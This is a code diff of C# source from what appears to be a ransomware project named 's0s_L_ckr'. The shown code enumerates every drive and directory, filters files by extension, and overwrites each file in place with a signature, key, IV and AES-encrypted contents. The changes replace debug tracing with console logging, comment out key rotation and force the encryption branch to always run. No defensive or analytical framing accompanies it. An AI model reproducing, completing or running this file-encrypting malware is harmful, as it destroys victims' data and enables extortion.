@@ -17,59 +17,46 @@ namespace s0s_L_ckr
         [MethodImpl(MethodImplOptions.AggressiveInlining)]
         public void EncrDis()
         {
-#if DEBUG
-            Trace.WriteLine("[*]Encrypt Disks");
-#endif
-            DriveInfo[] driveInfos = DriveInfo.GetDrives();
 
-#if DEBUG
-            Trace.WriteLine($"[+] {driveInfos} was enumerated");
-#endif
+            DriveInfo[] allDrives = DriveInfo.GetDrives();
+
             //Iterate all drives
-            foreach (DriveInfo drive in driveInfos)
+            foreach (DriveInfo d in allDrives)
             {
-                EncrDrv(drive);
+                EncrDrv(d);
             }
         }
         private void EncrDrv(DriveInfo drive)
         {
-#if DEBUG
-            Trace.WriteLine($"[*] EncrypDrive ({drive.Name})");
-            Trace.Indent();
-#endif
             // Drive check
-            if (drive.IsReady)
+            if (drive.IsReady == true)
             {
-                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();
+                DirectoryInfo[] di = drive.RootDirectory.GetDirectories();
 
-                foreach (DirectoryInfo directoryInfo in directories)
-                    EncrDir(directoryInfo);
+                try
+                {
+                    foreach (DirectoryInfo directoryInfo in di)
+                        EncrDir(directoryInfo);
+                }
+
+                catch (Exception e)
+                {
+                    Console.WriteLine("Woopsie", e.ToString());
+                }
+
             }
             else
             {
-#if DEBUG
-                Trace.WriteLine("[+] Drive is not Ready");
-#endif
+                Console.WriteLine("Error in Drive state " + drive.Name);
             }
-#if DEBUG
-            Trace.Unindent();
-#endif
         }
 
         private void EncrDir(DirectoryInfo directoryInfo)
         {
-#if DEBUG
-            Trace.WriteLine("");
-            Trace.WriteLine($"[*] EncrDir {directoryInfo.Name}");
-#endif
             //Checking Directory Filter
             if (!Comn.DireInFil(directoryInfo.FullName))
             {
-#if DEBUG
-                Trace.Indent();
-                Trace.WriteLine("[+] Directory not present in filter");
-                Trace.Unindent();
-#endif
+                Console.WriteLine($"Error in {directoryInfo.FullName}");
                 return;
             }
 
@@ -90,69 +77,64 @@ namespace s0s_L_ckr
             }
             catch (Exception e)
             {
-#if DEBUG
-                Trace.WriteLine("");
-                Trace.WriteLine($"[!] Error while in {directoryInfo.Name}");
-                Trace.WriteLine(e.ToString());
-#endif
+                Console.WriteLine($"[!] Error while in {directoryInfo.Name}");
+                Console.WriteLine(e.ToString());
             }
         }
 
         private void EncrFil(FileInfo file)
         {
             Thread.Sleep(10);
-#if DEBUG
-            Trace.WriteLine("");
-            Trace.WriteLine($"[*] EncrFil at {file.Name}");
-#endif
+            //Console.WriteLine($"[*] EncrFil at {file.Name}");
+
             //File Filter
-            if (Comn.CheckSig(file))
+            if (Comn.FileInFil(file.Extension))
             {
+                Console.WriteLine("Encrypting " + file.FullName);
                 //If file signature returns false
-                if (!Comn.CheckSig(file))
+                bool v = Comn.CheckSig(file);
+                bool b = true;
+                if (b)
                 {
                     //Encrypt all the things
-#if DEBUG
-                    Trace.WriteLine("[+] Files to encrypt");
-#endif
                     //Rotate AES Key
-                    CriptoKeyMgr.RotAesKey();
+                    //CriptoKeyMgr.RotAesKey();
 
                     //Reading Data in files
                     Byte[] fileDat = null;
                     FileMgr.ReadFil(file, ref fileDat);
 
-                    //Encrypt File
-                    using (FileStream fileStream = File.OpenWrite(file.FullName))
+                    try
                     {
-                        fileStream.Position = 0;
+                        //Encrypt File
+                        //CriptoFilMgr.EncryptFile(file.FullName);
+                       using (FileStream fileStream = File.OpenWrite(file.FullName))
+                        {
+                            fileStream.Position = 0;
 
-                        //File Structure for encrypted data
-                        fileStream.Write(ConfigMgr.FILE_SIGN, 0, ConfigMgr.FILE_SIGN_SIZE); ;
-                        fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_KEY, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
-                        fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_IV, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
-                        fileStream.Flush();
+                            //File Structure for encrypted data
+                            fileStream.Write(ConfigMgr.FILE_SIGN, 0, ConfigMgr.FILE_SIGN_SIZE);
+                            fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_KEY, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
+                            fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_IV, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
+                            fileStream.Flush();
 
-                        //Write Encrypted data to section
-                        CriptoFilMgr.Encrypt(fileStream, ref fileDat);
+                            //Write Encrypted data to section
+                            CriptoFilMgr.Encrypt(fileStream, ref fileDat);
+                        }
                     }
-                }
+                    catch (UnauthorizedAccessException)
+                    {
+                        return;
+                    }
+                    }
                 else
                 {
-#if DEBUG
-                    Trace.WriteLine("[+] File Already Encrypted");
-#endif
+                    Console.WriteLine("[+] File Already Encrypted");
                 }
             }
-            else
             {
-#if DEBUG
-                Trace.WriteLine("[+] File Filtr not Allowed");
-#endif
+                //Console.WriteLine("[+] File Filtr not Allowed");
             }
-#if DEBUG
-            Trace.Unindent();
-#endif
         }
     }
 }
